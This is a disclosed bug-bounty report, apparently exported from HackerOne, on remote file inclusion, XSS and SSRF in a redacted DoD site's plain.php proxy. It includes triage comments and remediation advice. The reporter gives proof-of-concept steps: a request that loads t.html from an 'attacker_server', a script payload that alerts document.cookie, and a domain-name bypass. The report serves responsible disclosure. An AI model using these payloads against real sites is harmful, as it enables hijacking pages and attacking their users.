{"id":192940,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI5NDA=","url":"https://hackerone.com/reports/192940","title":"Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting (XSS) in ████████","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-12-21T03:42:57.057Z","submitted_at":"2016-12-21T03:42:57.057Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jutsuce","url":"/jutsuce","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-02T17:52:45.860Z","bug_reporter_agreed_on_going_public_at":"2018-06-30T22:47:02.542Z","team_member_agreed_on_going_public_at":"2019-12-02T17:52:45.710Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Details:\nThere is currently a security misconfiguration on `plain.php` function located on the host `http://██████████/` allowing attackers to include webserver contents of their choosing (no restriction on filetypes and/or IP addresses), as well as embed malicious javascript payloads in the response via filenames. **This allows attackers to hijack the entire page as a malicious file hosting relay and/or leverage it for XSS attacks on users (authenticated or otherwise).** \n\n### Technical Explanation:\nThis vulnerability occurs because of the web application's functionality which is intended to pull directory contents from a specified location. **This functionality extends to importing the contents of those files, meaning that web-page formatted code and/or web page files (`.php`,`.html` etc.) saved on the attacker's server, will be rendered to the victim BY the `████████` server.** \n\n### Exploitation and Validation: \n**The above information means that attackers can do things like the following:**\n\n--------\n#[1]\n1. Setup attacking server with malicious web page(s): `python -m SimpleHTTPServer 80`\n2. Import the web-page directly into the █████ page: `http://███/████/proxys/plain.php?url=http://attacker_server/t.html\u0026operation=GetParameterInfo\u0026parameter=countryBoundaryLayer\u0026outputFormat=JSON`.\n\n███\n█████\n**Source \u0026 Contents of `t.html`:**\n```\n\u003ch1\u003eJUTSUCE RFI TEST\u003c/h1\u003e\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n\u003cscript\u003ealert('jutsuce')\u003c/script\u003e\n```\n█████████\n\n--------\n#[2]\nAdditional Exploitation Vectors:\n██████\n███\n████████\n██████\n--------\n#[3]\n**Due to the lack of whitelisting and/or site restrictions pseudo-Server-Side-Request-Forgery (SSRF) is a feasible attack vector, and would be easily automated:**\n* Internal IP Address Scanning\n* Internal Site \u0026/or File Compromise\n\n-------\n### Remediation:\n**Remove the ability for any external interaction within a functionality of this nature. If external interaction is absolutely required then alongside whitelisting (what hosts/files/etc. are valid), authenticative restrictions should be implemented in order to restrict accessibility.** Whether or not interaction is restricted to internalized site(s), the function should have whitelisting implemented to stop the [3] set of exploit vectors listed above.\n\nThank you!\n\n`~Jutsuce`","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["eveeez","whitesector","jutsuce","dunkhighsb","zclark1"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1378486,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2016-12-21T03:42:57.332Z","updated_at":"2016-12-21T03:42:57.332Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1378501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"#### Neglected to include one last screenshot showcasing the fact that the code is in-fact ported from the remote attacker's server, to that of the host: `███████`.","automated_response":false,"created_at":"2016-12-21T04:01:21.930Z","updated_at":"2019-10-10T19:51:13.864Z","actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1380529,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2016-12-21T21:14:28.943Z","updated_at":"2016-12-21T21:14:28.943Z","actor":{"username":"styn","cleared":false,"url":"/styn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1380539,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-12-21T21:15:59.653Z","updated_at":"2016-12-21T21:15:59.653Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":15419},"actor":{"username":"styn","cleared":false,"url":"/styn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1485017,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings,\n\nWe have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.\n\nIf we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.\n\nIf you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2017-02-14T15:32:43.903Z","updated_at":"2017-02-14T15:32:43.903Z","actor":{"username":"dklinedinst","cleared":false,"url":"/dklinedinst","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1486279,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The vulnerability included (at first glance) above does not seem to be exploitable via direct IP addresses, **however it is still exploitable via domain names**. As seen in the screenshot below I am still able to import contents of external sites at will via the same method listed above. \n\n### See: `https://█████████/████/proxys/plain.php?url=http://justifysecurity.com/`\n### Direct IP: \n██████\n\n### Domain Addresses \n- I.E. - `https://█████/█████/proxys/plain.php?url=http://justifysecurity.com/`:\n\n███████\n\n█████████\n\n### Remediation Recommendation(s):\n\u003eRemove the ability for any external interaction within a functionality of this nature. If external interaction is absolutely required then alongside white-listing (what hosts/files/etc. are valid), authenticative restrictions should be implemented in order to restrict accessibility. Whether or not interaction is restricted to internalized site(s), the function should have white-listing implemented to stop the [3] set of exploit vectors listed above.\n\n* Creation of a white-list containing the domain(s) and addresses that are allowed for this functionality.\n* Functionality change: import the data to the device server-side from the trusted source(s) manually or automatically; implementing the white-list server-side would be necessary if this is automated. Then pull in the data from the trusted source (i.e. the same server that the application is hosted on).","automated_response":false,"created_at":"2017-02-15T03:42:08.940Z","updated_at":"2019-10-11T17:35:16.118Z","actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2304044,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"Hello there! Following up closing in on a year since this has been updated after patch attempts and finding validation. ","automated_response":false,"created_at":"2018-01-20T20:32:34.298Z","updated_at":"2018-01-20T20:32:34.298Z","actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2510430,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2018-03-20T14:22:50.399Z","updated_at":"2018-03-20T14:22:50.399Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jutsuce","url":"/jutsuce"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2966844,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you so much for the response! Could we publicly disclose this?","automated_response":false,"created_at":"2018-06-30T22:47:02.569Z","updated_at":"2018-06-30T22:47:02.569Z","first_to_agree":true,"actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2966850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My apologies, I noticed that the host is in the title, limited disclosure of course would be fine. Thank you once again.","automated_response":false,"created_at":"2018-06-30T22:51:19.360Z","updated_at":"2018-06-30T22:51:19.360Z","actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5934040,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there team! Just checking in, any update on public disclosure?","automated_response":false,"created_at":"2019-10-01T16:29:12.725Z","updated_at":"2019-10-01T16:29:12.725Z","actor":{"username":"jutsuce","cleared":false,"url":"/jutsuce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/752/a7272945adf687a6dd5ed1e756f92f0559119d0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6450001,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Approved for disclosure. Thanks for your participation in the DoD Vulnerability Disclosure Program (VDP). Please follow us on Twitter @DC3VDP.","automated_response":false,"created_at":"2019-12-02T17:52:45.727Z","updated_at":"2019-12-02T17:52:45.727Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6450002,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-02T17:52:45.877Z","updated_at":"2019-12-02T17:52:45.877Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}